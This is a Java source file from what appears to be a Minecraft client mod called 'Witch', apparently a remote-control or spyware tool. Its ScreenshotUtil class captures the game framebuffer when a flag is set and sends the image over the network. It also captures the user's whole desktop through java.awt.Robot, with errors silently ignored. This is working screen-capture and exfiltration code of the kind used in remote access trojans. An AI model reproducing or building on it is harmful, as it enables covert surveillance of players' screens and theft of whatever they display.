package me.soda.witch.client.utils;

import me.soda.witch.client.events.TickEvent;
import me.soda.witch.shared.events.EventBus;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.util.ScreenshotRecorder;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

import static me.soda.witch.client.Witch.mc;

public class ScreenshotUtil {
    private static boolean shouldTake = false;

    static {
        EventBus.INSTANCE.registerEvent(TickEvent.class, event -> {
            try (NativeImage image = ScreenshotRecorder.takeScreenshot(mc.getFramebuffer())) {
                if (shouldTake) NetUtil.send("screenshot", image.getBytes());
                shouldTake = false;
            } catch (Exception ignored) {
            }
        });
    }

    public static void gameScreenshot() {
        shouldTake = true;
    }

    public static byte[] systemScreenshot() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ImageIO.write(image, "png", out);
        out.flush();
        byte[] bytes = out.toByteArray();
        out.close();
        return bytes;
    }
}
